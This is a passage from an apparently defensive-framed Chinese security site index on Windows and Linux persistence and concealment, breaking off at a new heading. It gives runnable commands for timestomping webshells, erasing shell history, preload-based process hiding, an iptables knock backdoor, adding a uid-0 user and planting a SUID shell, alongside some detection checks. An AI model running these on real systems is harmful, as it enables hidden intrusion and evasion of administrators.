win7\u53cawin7\u4ee5\u4e0a\u7cfb\u7edf\u589e\u52a0\u4e86KnownDLLs\u4fdd\u62a4\uff0c\u9700\u8981\u5728\u6ce8\u518c\u8868\uff1a HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls \u4e0b\u6dfb\u52a0 \u201clpk.dll\u201d \u624d\u80fd\u987a\u5229\u52ab\u6301\uff1a 0x07 COM\u52ab\u6301 \u5229\u7528COM\u52ab\u6301\u6280\u672f\uff0c\u6700\u4e3a\u5173\u952e\u7684\u662fdll\u7684\u5b9e\u73b0\u4ee5\u53caCLSID\u7684\u9009\u62e9\uff0c\u901a\u8fc7\u4fee\u6539CLSID\u4e0b\u7684\u6ce8\u518c\u8868\u952e\u503c\uff0c\u5b9e\u73b0\u5bf9CAccPropServicesClass\u548cMMDeviceEnumerator\u52ab\u6301\uff0c\u800c\u7cfb\u7edf\u5f88\u591a\u6b63\u5e38\u7a0b\u5e8f\u542f\u52a8\u65f6\u9700\u8981\u8c03\u7528\u8fd9\u4e24\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7ed5\u8fc7Autoruns\u5bf9\u542f\u52a8\u9879\u7684\u68c0\u6d4b\u3002 0x08 \u8fdc\u7a0b\u63a7\u5236 \u8fdc\u63a7\u6728\u9a6c\u662f\u4e00\u79cd\u6076\u610f\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5305\u62ec\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u7528\u4e8e\u7ba1\u7406\u63a7\u5236\u7684\u540e\u95e8\u3002\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\u901a\u5e38\u4e0e\u7528\u6237\u8bf7\u6c42\u7684\u7a0b\u5e8f\uff08\u5982\u6e38\u620f\u7a0b\u5e8f\uff09\u4e00\u8d77\uff0c\u662f\u4e00\u79cd\u770b\u4e0d\u89c1\u7684\u4e0b\u8f7d\uff0c\u6216\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u9644\u4ef6\u53d1\u9001\u3002\u4e00\u65e6\u4e3b\u673a\u7cfb\u7edf\u88ab\u653b\u7834\uff0c\u5165\u4fb5\u8005\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u5411\u5176\u4ed6\u6613\u53d7\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5206\u53d1\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\uff0c\u4ece\u800c\u5efa\u7acb\u50f5\u5c38\u7f51\u7edc\u3002 \u4e00\u822c\u5206\u4e3a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\uff0c\u5982\uff1a\u7070\u9e3d\u5b50\u3001\u4e0a\u5174\u8fdc\u63a7\u3001\u68a6\u60f3\u65f6\u4ee3\u3001QuasarRAT\u7b49\u3002 0x09 \u7ed3\u675f\u8bed \u672a\u77e5\u653b\u7109\u77e5\u9632\uff0c\u672c\u6587\u5206\u4eab\u4e86\u51e0\u79cdWindow\u4e0b\u7684\u81ea\u52a8\u542f\u6743\u9650\u7ef4\u6301\u6280\u672f\u3002\u7ba1\u7406\u5458\u5728\u5e73\u65f6\u8fd0\u7ef4\u8fc7\u7a0b\u5e94\u5f53\u4fdd\u6301\u8b66\u60d5\uff0c\u638c\u63e1\u4e00\u5b9a\u7684\u5165\u4fb5\u6392\u67e5\u6280\u5de7\uff0c\u53ca\u65f6\u8fdb\u884c\u7cfb\u7edf\u8865\u4e01\u66f4\u65b0\uff0c\u5b9a\u671f\u5bf9\u670d\u52a1\u5668\u5b89\u5168\u68c0\u67e5\uff0c\u624d\u80fd\u6709\u6548\u5730\u9884\u9632\u540e\u95e8\u3002 \u53c2\u8003\u6587\u7ae0\uff1a \u5e38\u89c1\u7684\u51e0\u79cdWindows\u540e\u95e8\u6301\u4e45\u5316\u65b9\u5f0f\uff1ahttps://www.freebuf.com/vuls/195906.html windows\u5e38\u89c1\u540e\u95e8\u9690\u85cf\u548c\u6743\u9650\u7ef4\u6301\u65b9\u6cd5 https://blog.csdn.net/qq_33020901/article/details/89504902 http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/ \u57fa\u4e8ePython\u7684\u9690\u79d8Windows\u540e\u95e8\uff0c\u4f7f\u7528Github\u4f5c\u4e3a\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668 https://github.com/maldevel/canisrufus \u6ce8\u518c\u8868\u4f4d\u7f6e\u53c2\u8003 http://www.360doc.com/content/12/0217/15/1309227_187374989.shtml https://www.secpulse.com/archives/103301.html WMI\u540e\u95e8\u53c2\u8003 http://www.hackdig.com/11/hack-40748.htm https://blog.csdn.net/qq_17204441/article/details/91863383 \u65e0\u6587\u4ef6WMI\u548cPowerShell\u540e\u95e8 Windows \u4e0b\u7684\u6743\u9650\u7ef4\u6301\uff1ahttps://www.anquanke.com/post/id/171528 Windows\u4e0b\u7684\u6743\u9650\u7ef4\u6301\uff08\u4e8c\uff09https://www.anquanke.com/post/id/172851","title":"\u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#3linux-","text":"","title":"\u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x00_1","text":"\u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u4f1a\u901a\u8fc7\u4e00\u4e9b\u6280\u5de7\u6765\u9690\u85cf\u81ea\u5df1\u7684\u8e2a\u8ff9\u548c\u540e\u95e8\u6587\u4ef6\uff0c\u672c\u6587\u4ecb\u7ecdLinux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x01_1","text":"Linux \u4e0b\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\uff1a touch .test.txt touch \u547d\u4ee4\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u524d\u9762\u52a0\u4e00\u4e2a \u70b9 \u5c31\u4ee3\u8868\u662f\u9690\u85cf\u6587\u4ef6,\u5982\u4e0b\u56fe\uff1a \u4e00\u822c\u7684Linux\u4e0b\u7684\u9690\u85cf\u76ee\u5f55\u4f7f\u7528\u547d\u4ee4 ls -l \u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u53ea\u80fd\u67e5\u770b\u5230\u6587\u4ef6\u53ca\u6587\u4ef6\u5939\uff0c\u67e5\u770bLinux\u4e0b\u7684\u9690\u85cf\u6587\u4ef6\u9700\u8981\u7528\u5230\u547d\u4ee4\uff1a ls -al \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728/tmp\u4e0b\uff0c\u9ed8\u8ba4\u5b58\u5728\u591a\u4e2a\u9690\u85cf\u76ee\u5f55\uff0c\u8fd9\u4e9b\u76ee\u5f55\u662f\u6076\u610f\u6587\u4ef6\u5e38\u7528\u6765\u85cf\u8eab\u7684\u5730\u65b9\u3002\u5982 /temp/.ICE-unix/\u3001/temp/.Test-unix/\u3001/temp/.X11-unix/\u3001/temp/.XIM-unix/","title":"0x01 \u9690\u85cf\u6587\u4ef6"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x02_1","text":"Unix \u4e0b\u85cf\u540e\u95e8\u5fc5\u987b\u8981\u4fee\u6539\u65f6\u95f4\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u76f4\u63a5\u5229\u7528 touch \u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982\u53c2\u8003 index.php \u7684\u65f6\u95f4\uff0c\u518d\u8d4b\u7ed9 webshell.php\uff0c\u7ed3\u679c\u4e24\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u5c31\u4e00\u6837\u4e86\u3002 \u5229\u7528\u65b9\u6cd5 touch -r index.php webshell.php \u6216\u8005\u76f4\u63a5\u5c06\u65f6\u95f4\u6233\u4fee\u6539\u6210\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\u3002\u5982\u4e0b 2014 \u5e74 01 \u6708 02 \u65e5\u3002 touch -t 1401021042.30 webshell.php","title":"0x02 \u9690\u85cf\u6587\u4ef6\u65f6\u95f4\u6233"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x03_1","text":"\u5728Linux\u4e2d\uff0c\u4f7f\u7528chattr\u547d\u4ee4\u6765\u9632\u6b62root\u548c\u5176\u4ed6\u7ba1\u7406\u7528\u6237\u8bef\u5220\u9664\u548c\u4fee\u6539\u91cd\u8981\u6587\u4ef6\u53ca\u76ee\u5f55\uff0c\u6b64\u6743\u9650\u7528ls -l\u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u6743\u9650\u7684\u76ee\u7684\u3002 \u8fd9\u4e2a\u6280\u5de7\u5e38\u88ab\u7528\u5728\u540e\u95e8\uff0c\u53d8\u6210\u4e86\u4e00\u4e9b\u96be\u4ee5\u6e05\u9664\u7684\u540e\u95e8\u6587\u4ef6\uff0c\u4ee4\u5f88\u591a\u65b0\u624b\u670b\u53cb\u611f\u5230\u5934\u75bc\u3002 chattr +i evil.php \u9501\u5b9a\u6587\u4ef6 lsattr evil.php \u5c5e\u6027\u67e5\u770b chattr -i evil.php \u89e3\u9664\u9501\u5b9a rm -rf 1.evil.php \u5220\u9664\u6587\u4ef6","title":"0x03 \u9690\u85cf\u6743\u9650"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x04_1","text":"\u5728shell\u4e2d\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e0d\u5e0c\u671b\u88ab\u8bb0\u5f55\u5728\u547d\u4ee4\u884c\u5386\u53f2\u4e2d\uff0c\u5982\u4f55\u5728linux\u4e2d\u5f00\u542f\u65e0\u75d5\u64cd\u4f5c\u6a21\u5f0f\u5462\uff1f \u6280\u5de7\u4e00\uff1a\u53ea\u9488\u5bf9\u4f60\u7684\u5de5\u4f5c\u5173\u95ed\u5386\u53f2\u8bb0\u5f55 [space]set +o history \u5907\u6ce8\uff1a[space] \u8868\u793a\u7a7a\u683c\u3002\u5e76\u4e14\u7531\u4e8e\u7a7a\u683c\u7684\u7f18\u6545\uff0c\u8be5\u547d\u4ee4\u672c\u8eab\u4e5f\u4e0d\u4f1a\u88ab\u8bb0\u5f55\u3002 \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u4e34\u65f6\u7981\u7528\u5386\u53f2\u529f\u80fd\uff0c\u8fd9\u610f\u5473\u7740\u5728\u8fd9\u547d\u4ee4\u4e4b\u540e\u4f60\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u8bb0\u5f55\u5230\u5386\u53f2\u4e2d\uff0c\u7136\u800c\u8fd9\u4e2a\u547d\u4ee4\u4e4b\u524d\u7684\u6240\u6709\u4e1c\u897f\u90fd\u4f1a\u539f\u6837\u8bb0\u5f55\u5728\u5386\u53f2\u5217\u8868\u4e2d\u3002 \u8981\u91cd\u65b0\u5f00\u542f\u5386\u53f2\u529f\u80fd\uff0c\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a [Space]set -o history \u5b83\u5c06\u73af\u5883\u6062\u590d\u539f\u72b6\uff0c\u4e5f\u5c31\u662f\u4f60\u5b8c\u6210\u4e86\u4f60\u7684\u5de5\u4f5c\uff0c\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u4e4b\u540e\u7684\u547d\u4ee4\u90fd\u4f1a\u51fa\u73b0\u5728\u5386\u53f2\u4e2d\u3002 \u6280\u5de7\u4e8c\uff1a\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u6307\u5b9a\u7684\u547d\u4ee4 \u5047\u8bbe\u5386\u53f2\u8bb0\u5f55\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u4e00\u4e9b\u4f60\u4e0d\u5e0c\u671b\u8bb0\u5f55\u7684\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u600e\u4e48\u529e\uff1f\u5f88\u7b80\u5355\u3002\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u5220\u9664\uff1a history | grep \"keyword\" \u8f93\u51fa\u5386\u53f2\u8bb0\u5f55\u4e2d\u5339\u914d\u7684\u547d\u4ee4\uff0c\u6bcf\u4e00\u6761\u524d\u9762\u4f1a\u6709\u4e2a\u6570\u5b57\u3002\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u90a3\u4e2a\u6307\u5b9a\u7684\u9879\uff1a history -d [num] \u8fd9\u79cd\u6280\u5de7\u662f\u5173\u952e\u8bb0\u5f55\u5220\u9664\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u70b9\uff0c\u6bd4\u5982\u524d150\u884c\u662f\u7528\u6237\u7684\u6b63\u5e38\u64cd\u4f5c\u8bb0\u5f55\uff0c150\u4ee5\u540e\u662f\u653b\u51fb\u8005\u64cd\u4f5c\u8bb0\u5f55\u3002\u6211\u4eec\u53ef\u4ee5\u53ea\u4fdd\u7559\u6b63\u5e38\u7684\u64cd\u4f5c\uff0c\u5220\u9664\u653b\u51fb\u75d5\u8ff9\u7684\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ea\u4fdd\u7559\u524d150\u884c\uff1a sed -i '150,$d' .bash_history","title":"0x04 \u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x05-ssh","text":"\u9690\u8eab\u767b\u5f55\u7cfb\u7edf\uff0c\u4e0d\u4f1a\u88abw\u3001who\u3001last\u7b49\u6307\u4ee4\u68c0\u6d4b\u5230\u3002 ssh -T root@127.0.0.1 /bin/bash -i \u4e0d\u8bb0\u5f55ssh\u516c\u94a5\u5728\u672c\u5730.ssh\u76ee\u5f55\u4e2d ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash \u2013i","title":"0x05 \u9690\u85cf\u8fdc\u7a0bSSH\u767b\u9646\u8bb0\u5f55"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x06","text":"\u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Linux\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u7b2c\u4e00\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7SSLH\u5728\u540c\u4e00\u7aef\u53e3\u4e0a\u5171\u4eabSSH\u4e0eHTTPS #\u5b89\u88c5SSLH sudo apt-get install sslh #\u914d\u7f6eSSLH \u7f16\u8f91 SSLH \u914d\u7f6e\u6587\u4ef6\uff1a sudo vi /etc/default/sslh 1\u3001\u627e\u5230\u4e0b\u5217\u884c\uff1aRun=no \u5c06\u5176\u4fee\u6539\u4e3a\uff1aRun=yes 2\u3001\u4fee\u6539\u4ee5\u4e0b\u884c\u4ee5\u5141\u8bb8 SSLH \u5728\u6240\u6709\u53ef\u7528\u63a5\u53e3\u4e0a\u4fa6\u542c\u7aef\u53e3 443 DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\" \u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff1a\u5229\u7528IPTables\u8fdb\u884c\u7aef\u53e3\u590d\u7528 # \u7aef\u53e3\u590d\u7528\u94fe iptables -t nat -N LETMEIN # \u7aef\u53e3\u590d\u7528\u89c4\u5219 iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 # \u5f00\u542f\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT # \u5173\u95ed\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT # let's do it iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN \u5229\u7528\u65b9\u5f0f\uff1a #\u5f00\u542f\u590d\u7528 echo threathuntercoming | socat - tcp:192.168.28.128:80 #ssh\u4f7f\u752880\u7aef\u53e3\u8fdb\u884c\u767b\u5f55 ssh -p 80 root@192.168.28.128 #\u5173\u95ed\u590d\u7528 echo threathunterleaving | socat - tcp:192.168.28.128:80 \u5177\u4f53\u6587\u7ae0\u8be6\u89c1\uff1a \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528","title":"0x06 \u7aef\u53e3\u590d\u7528"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x07","text":"\u7ba1\u7406\u5458\u65e0\u6cd5\u901a\u8fc7\u76f8\u5173\u547d\u4ee4\u5de5\u5177\u67e5\u627e\u5230\u4f60\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u76ee\u7684\uff0c\u5b9e\u73b0\u8fdb\u7a0b\u9690\u85cf\u3002 \u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1alibprocesshider github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gianlucaborello/libprocesshider \u5229\u7528 LD_PRELOAD \u6765\u5b9e\u73b0\u7cfb\u7edf\u51fd\u6570\u7684\u52ab\u6301\uff0c\u5b9e\u73b0\u5982\u4e0b # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ && make # \u79fb\u52a8\u6587\u4ef6\u5230/usr/local/lib/\u76ee\u5f55\u4e0b cp libprocesshider.so /usr/local/lib/ # \u628a\u5b83\u52a0\u8f7d\u5230\u5168\u5c40\u52a8\u6001\u8fde\u63a5\u5c40 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload \u6d4b\u8bd5\uff1a\u8fd0\u884c evil_script.py\uff0c \u6b64\u65f6\u53d1\u73b0\u5728top \u4e0e ps \u4e2d\u90fd\u65e0\u6cd5\u627e\u5230 evil_script.py\uff0c cpu \u4f7f\u7528\u7387\u9ad8,\u4f46\u662f\u5374\u627e\u4e0d\u5230\u4efb\u4f55\u5360\u7528cpu\u9ad8\u7684\u7a0b\u5e8f\u3002 \u5982\u4f55\u5728Linux\u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\uff0c unhide \u662f\u4e00\u4e2a\u5c0f\u5de7\u7684\u7f51\u7edc\u53d6\u8bc1\u5de5\u5177\uff0c\u80fd\u591f\u53d1\u73b0\u90a3\u4e9b\u501f\u52a9rootkit\uff0cLKM\u53ca\u5176\u5b83\u6280\u672f\u9690\u85cf\u7684\u8fdb\u7a0b\u548cTCP / UDP\u7aef\u53e3\u3002\u8fd9\u4e2a\u5de5\u5177\u5728Linux\uff0cUNIX\u7c7b\uff0cMS-Windows\u7b49\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u90fd\u53ef\u4ee5\u5de5\u4f5c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.unhide-forensics.info/ # \u5b89\u88c5 sudo yum install unhide # \u4f7f\u7528 unhide [options] test_list \u4f7f\u7528 unhide proc \u53d1\u73b0\u9690\u85cf\u8fdb\u7a0bevil_script.py\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u8fdb\u7a0b\u6ce8\u5165\u5de5\u5177linux-inject linux-inject\u662f\u7528\u4e8e\u5c06\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165Linux\u8fdb\u7a0b\u7684\u5de5\u5177 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gaffe23/linux-inject.git # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject && make # \u6d4b\u8bd5\u8fdb\u7a0b ./sample-target # \u8fdb\u7a0b\u6ce8\u5165 ./inject -n sample-target sample-library.so \u9a8c\u8bc1\u8fdb\u7a0b\u6ce8\u5165\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a Cymothoa\u662f\u4e00\u6b3e\u9690\u79d8\u7684\u540e\u95e8\u5de5\u5177\u3002\u5b83\u901a\u8fc7\u5411\u76ee\u6807\u4e3b\u673a\u6d3b\u8dc3\u7684\u8fdb\u7a0b\u6ce8\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u83b7\u53d6\u548c\u539f\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u3002\u8be5\u5de5\u5177\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/ # \u4e0b\u8f7d\u89e3\u538b wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta && make","title":"0x07 \u8fdb\u7a0b\u9690\u85cf"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x07_1","text":"\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Linux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u6743\u9650\u3001\u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u9690\u85cf\u7b49\u65b9\u9762\u7684\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002 \u53c2\u8003\u6587\u7ae0\uff1a Tiny Shell \u8fd9\u6b3e\u5de5\u5177\u901a\u8fc7\u5728\u6e90\u7801\u4e2d\u8bbe\u7f6ePROCESS_NAME\u4e3abash\uff0c\u4ee5\u4f7f\u5f97\u5176\u8fd0\u884c\u540e\u7684\u8fdb\u7a0b\u540d\u663e\u793a\u4e3abash\u3002 \u5728\u6076\u610f\u4ee3\u7801\u4e2d\u901a\u8fc7\u8bbe\u7f6e\u5177\u6709\u8ff7\u60d1\u6027\u7684\u8fdb\u7a0b\u540d\u5b57\uff0c\u4ee5\u8fbe\u5230\u8eb2\u907f\u7ba1\u7406\u5458\u68c0\u67e5\u7684\u76ee\u7684\u3002 https://github.com/orangetw/tsh \u53c2\u8003\u6587\u7ae0\uff1a https://www.freebuf.com/sectool/138350.html mount-bind \u5229\u7528mount \u2014bind \u5c06\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u6302\u8f7d\u8986\u76d6\u81f3/proc/\u76ee\u5f55\u4e0b\u6307\u5b9a\u8fdb\u7a0bID\u7684\u76ee\u5f55 \u804a\u4e00\u804aLinux\u4e0b\u8fdb\u7a0b\u9690\u85cf\u7684\u5e38\u89c1\u624b\u6cd5\u53ca\u4fa6\u6d4b\u624b\u6bb5 https://www.anquanke.com/post/id/160843 \u53cd\u5165\u4fb5\u4e4b\u53d1\u73b0\u540e\u95e8\u5229\u7528mount-bind\u5c06\u8fdb\u7a0b\u548c\u7aef\u53e3\u4fe1\u606f\u9690\u533f https://www.freebuf.com/articles/network/140535.html https://blog.csdn.net/liuqz2009/article/details/43530201 Linux \u5171\u4eab\u5e93\u6ce8\u5165\u540e\u95e8 linux \u8fdb\u7a0b\u6ce8\u5165\u540e\u95e8\u5de5\u5177Cymothoa \u5982\u4f55\u9690\u85cf\u4f60\u7684 Linux \u7684\u547d\u4ee4\u884c\u5386\u53f2 https://www.linuxprobe.com/hidden-cmd-history.html \u5229\u7528sslh\u5b9e\u73b0\u7aef\u53e3\u590d\u7528 https://www.bbsmax.com/A/QW5YwpWezm/ \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528 https://www.freebuf.com/articles/network/137683.html Venom \u591a\u7ea7\u4ee3\u7406\u5de5\u5177 linux \u4e0b\u9690\u85cf\u8fdb\u7a0b\u7684\u4e00\u79cd\u65b9\u6cd5\u53ca\u9047\u5230\u7684\u5751 https://www.jb51.net/article/147024.htm \u5982\u4f55\u5728 Linux/Unix/Windows \u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\u548c\u7aef\u53e3 https://linux.cn/article-9288-1.html","title":"0x07 \u7ed3\u8bed"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#4linux-","text":"\u672c\u6587\u5c06\u5bf9Linux\u4e0b\u5e38\u89c1\u7684\u6743\u9650\u7ef4\u6301\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u767e\u6218\u4e0d\u6b86\u3002 1\u3001\u4e00\u53e5\u8bdd\u6dfb\u52a0\u7528\u6237\u548c\u5bc6\u7801 \u6dfb\u52a0\u666e\u901a\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684\u666e\u901a\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p \u65b9\u6cd5 ` ` \u662f\u7528\u6765\u5b58\u653e\u53ef\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4,\"$()\"\u4e5f\u53ef\u4ee5\u5b58\u653e\u547d\u4ee4\u6267\u884c\u8bed\u53e5 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd\u65b9\u6cd5 useradd guest;echo 'guest:123456'|chpasswd # echo -e\u65b9\u6cd5 useradd test;echo -e \"123456\\n123456\\n\" |passwd test \u6dfb\u52a0root\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684root\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test \u53ef\u7591\u7528\u6237\u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd # \u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow # \u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 2\u3001SUID Shell Suid shell\u662f\u4e00\u79cd\u53ef\u7528\u4e8e\u4ee5\u62e5\u6709\u8005\u6743\u9650\u8fd0\u884c\u7684shell\u3002 \u914d\u5408\u666e\u901a\u7528\u6237\u6743\u9650\u4f7f\u7528 cp /bin/bash /tmp/shell chmod u+s /tmp/shell \u4f7f\u7528guest\u7528\u6237\u767b\u5f55\u5c31\u53ef\u7591\u83b7\u53d6root\u6743\u9650\u3002 \u5907\u6ce8\uff1abash2\u9488\u5bf9suid\u505a\u4e86\u4e00\u4e9b\u9632\u62a4\u63aa\u65bd\uff0c\u9700\u8981\u4f7f\u7528-p\u53c2\u6570\u6765\u83b7\u53d6\u4e00\u4e2aroot shell\u3002\u53e6\u5916\uff0c\u666e\u901a\u7528\u6237\u6267\u884c\u8fd9\u4e2aSUID shell\u65f6\uff0c\u4e00\u5b9a\u8981\u4f7f\u7528\u5168\u8def\u5f84\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u5728Linux\u4e2d\u67e5\u627eSUID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /4000 # \u5728Linux\u4e2d\u67e5\u627e\u4f7f\u7528SGID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /2000 # \u53d6\u6d88s\u6743\u9650 chmod u-s /tmp/shell 3\u3001ssh\u516c\u79c1\u94a5\u514d\u5bc6\u767b\u5f55 